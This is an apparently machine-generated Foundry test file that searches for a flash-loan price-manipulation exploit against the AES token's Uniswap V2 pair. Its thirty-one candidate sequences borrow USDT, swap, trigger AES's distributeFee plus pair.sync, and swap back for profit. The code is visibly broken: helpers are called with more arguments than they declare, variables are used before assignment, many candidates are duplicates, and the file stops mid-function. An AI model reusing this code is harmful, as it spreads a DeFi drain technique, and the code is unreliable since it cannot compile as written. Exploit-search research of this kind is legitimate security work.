// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AES} from "./AES.sol";
import {AttackContract} from "./AttackContract.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
contract AESTest is Test, BlockLoader {
AES aes;
USDT usdt;
UniswapV2Pair pair;
UniswapV2Factory factory;
UniswapV2Router router;
AttackContract attackContract;
address owner;
address attacker;
address aesAddr;
address usdtAddr;
address pairAddr;
address factoryAddr;
address routerAddr;
address attackerAddr;
uint256 blockTimestamp = 1670403423;
uint112 reserve0pair = 64026931732834970073285;
uint112 reserve1pair = 3976072419420817555481090;
uint32 blockTimestampLastpair = 1670402979;
uint256 kLastpair = 250000000000000000000000000000000000000000000000;
uint256 price0CumulativeLastpair = 8186339539916590645979676076811473439021;
uint256 price1CumulativeLastpair = 1309036025684247482259206283363904562;
uint256 totalSupplyaes = 80966356010303897340499440;
uint256 balanceOfaespair = 3976072419420817555481090;
uint256 balanceOfaesattacker = 0;
uint256 balanceOfaes = 0;
uint256 totalSupplyusdt = 3179997922170098408283525081;
uint256 balanceOfusdtpair = 64026931732834970073285;
uint256 balanceOfusdtattacker = 0;
uint256 balanceOfusdt = 0;
function setUp() public {
owner = address(this);
aes = new AES('AES', 'AES', address(usdt), [0xEb55526075eC7797d5CdcF4C3263fA39004B958D, 0x05DE4Ea6D2472EB569B55e6A1Ada52d2a451d854,0x7c31f5c790CeA93d83aD94F92037Abc1c0d5740d, 0x3E1BA8607304EdC3d26eA6Fba67C09cEb2890AcA,0x3777aeec31907057c16F0b4dDC34A6B0a5dC53b6]);
aesAddr = address(aes);
usdt = new USDT();
usdtAddr = address(usdt);
pair = new UniswapV2Pair(                        address(usdt), address(aes),                         reserve0pair, reserve1pair,                         blockTimestampLastpair, kLastpair,                         price0CumulativeLastpair, price1CumulativeLastpair);
pairAddr = address(pair);
factory = new UniswapV2Factory(address(0xdead),address(pair),address(0x0),address(0x0));
factoryAddr = address(factory);
router = new UniswapV2Router(address(factory), address(0xdead));
routerAddr = address(router);
attackContract = new AttackContract();
attackerAddr = address(attacker);
attacker = address(attackContract);
// Initialize balances and mock flashloan.
usdt.transfer(address(pair), balanceOfusdtpair);
aes.transfer(address(pair), balanceOfaespair);
aes.afterDeploy(address(router), address(pair));
}
modifier eurus() {
_;
}
function printBalance(string memory tips) public {
emit log_string(tips);
emit log_string("Aes Balances: ");
queryERC20BalanceDecimals(address(usdt), address(aes), usdt.decimals());
queryERC20BalanceDecimals(address(aes), address(aes), aes.decimals());
emit log_string("");
emit log_string("Usdt Balances: ");
queryERC20BalanceDecimals(address(usdt), address(usdt), usdt.decimals());
queryERC20BalanceDecimals(address(aes), address(usdt), aes.decimals());
emit log_string("");
emit log_string("Pair Balances: ");
queryERC20BalanceDecimals(address(usdt), address(pair), usdt.decimals());
queryERC20BalanceDecimals(address(aes), address(pair), aes.decimals());
emit log_string("");
emit log_string("Attacker Balances: ");
queryERC20BalanceDecimals(address(usdt), address(attacker), usdt.decimals());
queryERC20BalanceDecimals(address(aes), address(attacker), aes.decimals());
emit log_string("");
emit log_string("");
emit log_string("");
}
function attackGoal() public returns (bool) {
emit log_named_uint("StartBalance", balanceOfusdtattacker);
emit log_named_uint("FinalBalance", usdt.balanceOf(attacker));
return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
}
function borrow_usdt_owner(uint256 amount) internal eurus{
vm.stopPrank();
vm.prank(owner);
usdt.transfer(attacker, amount);
vm.startPrank(attacker);
}
function payback_usdt_owner(uint256 amount) internal eurus{
usdt.transfer(owner, amount);
}
function borrow_aes_owner(uint256 amount) internal eurus{
vm.stopPrank();
vm.prank(owner);
aes.transfer(attacker, amount);
vm.startPrank(attacker);
}
function payback_aes_owner(uint256 amount) internal eurus{
aes.transfer(owner, amount);
}
function borrow_usdt_pair(uint256 amount) internal eurus{
vm.stopPrank();
vm.prank(address(pair));
usdt.transfer(attacker, amount);
vm.startPrank(attacker);
}
function payback_usdt_pair(uint256 amount) internal eurus{
usdt.transfer(address(pair), amount);
}
function borrow_aes_pair(uint256 amount) internal eurus{
vm.stopPrank();
vm.prank(address(pair));
aes.transfer(attacker, amount);
vm.startPrank(attacker);
}
function payback_aes_pair(uint256 amount) internal eurus{
aes.transfer(address(pair), amount);
}
function swap_pair_attacker_usdt_aes(uint256 amount, uint256 amountOut) internal eurus{
usdt.transfer(address(pair), amount);
pair.swap(0, amountOut, attacker, new bytes(0));
}
function swap_pair_attacker_aes_usdt(uint256 amount, uint256 amountOut) internal eurus{
aes.transfer(address(pair), amount);
pair.swap(amountOut, 0, attacker, new bytes(0));
}
function burn_aes_pair(uint256 amount) internal eurus { aes.distributeFee(); pair.sync(); }
function check_cand000(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11) public {
vm.startPrank(attacker);
vm.assume(amt10 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
payback_usdt_owner(amt10, amt11);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand001(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13) public {
vm.startPrank(attacker);
vm.assume(amt12 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
payback_usdt_owner(amt12, amt13);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand002(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13) public {
vm.startPrank(attacker);
vm.assume(amt12 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
payback_usdt_owner(amt12, amt13);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand003(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand004(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15) public {
vm.startPrank(attacker);
vm.assume(amt14 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
payback_usdt_owner(amt14, amt15);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand005(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15) public {
vm.startPrank(attacker);
vm.assume(amt14 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
payback_usdt_owner(amt14, amt15);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand006(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15) public {
vm.startPrank(attacker);
vm.assume(amt14 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
payback_usdt_owner(amt14, amt15);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand007(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15) public {
vm.startPrank(attacker);
vm.assume(amt14 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
payback_usdt_owner(amt14, amt15);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand008(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21) public {
vm.startPrank(attacker);
vm.assume(amt20 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
swap_pair_attacker_aes_usdt(amt16, amt17, amt18, amt19);
payback_usdt_owner(amt20, amt21);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand009(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21) public {
vm.startPrank(attacker);
vm.assume(amt20 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
swap_pair_attacker_aes_usdt(amt16, amt17, amt18, amt19);
payback_usdt_owner(amt20, amt21);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand010(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21) public {
vm.startPrank(attacker);
vm.assume(amt20 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
swap_pair_attacker_aes_usdt(amt16, amt17, amt18, amt19);
payback_usdt_owner(amt20, amt21);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand011(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand012(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand013(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand014(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand015(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21) public {
vm.startPrank(attacker);
vm.assume(amt20 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
swap_pair_attacker_aes_usdt(amt16, amt17, amt18, amt19);
payback_usdt_owner(amt20, amt21);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand016(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand017(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand018(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand019(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17) public {
vm.startPrank(attacker);
vm.assume(amt16 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
swap_pair_attacker_aes_usdt(amt12, amt13, amt14, amt15);
payback_usdt_owner(amt16, amt17);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand020(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23,uint256 amt24,uint256 amt25,uint256 amt26,uint256 amt27) public {
vm.startPrank(attacker);
vm.assume(amt26 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
swap_pair_attacker_usdt_aes(amt18, amt19, amt20, amt21);
swap_pair_attacker_aes_usdt(amt22, amt23, amt24, amt25);
payback_usdt_owner(amt26, amt27);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand021(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand022(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand023(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand024(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
swap_pair_attacker_aes_usdt(amt6, amt7, amt8, amt9);
swap_pair_attacker_usdt_aes(amt10, amt11, amt12, amt13);
burn_aes_pair(amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand025(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand026(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand027(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
swap_pair_attacker_usdt_aes(amt14, amt15, amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand028(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand029(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand030(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
